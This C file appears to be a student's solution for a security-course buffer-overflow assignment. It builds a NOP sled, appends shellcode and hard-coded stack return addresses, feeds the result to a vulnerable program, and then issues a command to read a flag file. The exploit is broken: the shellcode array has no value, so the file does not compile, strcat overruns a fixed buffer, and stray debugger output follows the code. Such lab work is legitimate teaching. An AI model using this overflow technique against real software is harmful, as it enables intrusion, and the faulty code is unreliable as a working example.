/* 
 * Attack 02 - Fill out this program to implement your attack for Problem 2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char* argv[])
{
char shellcode[] = 
char nop[] ="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";


char retAdd[] = "\x8d\xd3\xff\xff\x98\xd5\xff\xff\x98\xd5\xff\xff";

strcat(nop,shellcode);
strcat(nop,retAdd);


printf("%d\n", 19);
setbuf(stdout,NULL);
sleep(1);
printf("%s\n","AAAAAAA");
setbuf(stdout,NULL);
sleep(1);
printf("%s\n", nop);
setbuf(stdout,NULL);
sleep(1);
printf("cat /home/kamakshi/hw03/flag02.txt");
fflush(stdout);


  return 0;
}

0xffffd570       0xffffd570
ebp            0xffffd598 